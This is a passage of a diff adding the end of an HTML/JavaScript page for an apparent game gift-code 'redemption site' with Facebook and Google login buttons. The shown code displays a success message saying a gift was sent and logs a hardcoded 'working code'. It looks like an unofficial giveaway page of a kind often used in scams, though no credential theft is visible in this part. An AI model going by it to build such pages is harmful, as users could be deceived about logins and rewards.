+            modal.style.display = "flex";
+            
+            redeemBtn.disabled = false;
+            redeemBtn.innerHTML = "REDEEM";
+            codeInput.value = "";
+            
+            setMessage("✅ Redemption successful! Gift sent. Check your vault within 24 hours.", "success");
+        }
+        
+        function closeModal() {
+            modal.style.display = "none";
+        }
+        
+        // ============================================================
+        // EVENT LISTENERS
+        // ============================================================
+        loginBtn.addEventListener('click', handleLogin);
+        logoutBtn.addEventListener('click', handleLogout);
+        fbBtn.addEventListener('click', () => selectMethod('facebook'));
+        googleBtn.addEventListener('click', () => selectMethod('google'));
+        fetchBtn.addEventListener('click', handleFetchPlayer);
+        redeemBtn.addEventListener('click', handleRedeem);
+        
+        codeInput.addEventListener('input', (e) => { e.target.value = e.target.value.toUpperCase(); });
+        uidInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleFetchPlayer(); });
+        codeInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleRedeem(); });
+        modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
+        
+        // Initialize
+        createParticles();
+        console.log("Advanced Redemption Site Loaded | Working Code: FFMAGICCUBESG53");
+    </script>
+</body>
+</html>
